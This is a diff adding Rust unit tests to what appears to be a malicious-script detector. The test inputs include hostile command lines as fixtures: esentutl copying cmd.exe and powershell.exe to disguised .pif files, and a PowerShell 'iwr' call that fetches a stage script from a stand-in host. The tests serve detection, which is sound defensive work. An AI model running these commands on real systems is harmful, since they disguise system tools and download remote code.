@@ -12092,6 +12092,61 @@ mshta dropped.hta"#,
 }
 
 #[cfg(test)]
+#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
+mod esentutl_tests {
+    use crate::traits::Trait;
+    use crate::{analyze, Config};
+
+    #[test]
+    fn esentutl_copy_windows_util_emits_manipulation_trait() {
+        let script = br#"esentutl /y C:\Windows\System32\cmd.exe /d C:\Users\Public\alpha.pif /o"#;
+        let report = analyze(script, &Config::default());
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::WindowsUtilManip { src, dst, .. }
+                        if src == r#"C:\Windows\System32\cmd.exe"#
+                            && dst == r#"C:\Users\Public\alpha.pif"#
+                )
+            }),
+            "esentutl copied Windows utility was not surfaced: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn esentutl_copied_powershell_alias_is_scanned_as_manipulated_exec() {
+        let script = br#"esentutl /y C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe /d C:\Users\Public\psh.pif /o
+C:\Users\Public\psh.pif -NoProfile -Command "iwr https://esentutl-alias.example/stage.ps1"
+"#;
+        let report = analyze(script, &Config::default());
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::ManipulatedExec { target, .. }
+                        if target == r#"C:\Users\Public\psh.pif"#
+                )
+            }),
+            "esentutl-copied PowerShell alias was not surfaced as manipulated exec: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. }
+                        if src == "https://esentutl-alias.example/stage.ps1"
+                )
+            }),
+            "esentutl-copied PowerShell alias command was not scanned: {:?}",
+            report.traits
+        );
+    }
+}
+
+#[cfg(test)]
 mod tokenizer_misc_tests {
     use crate::interp::command_name;
 
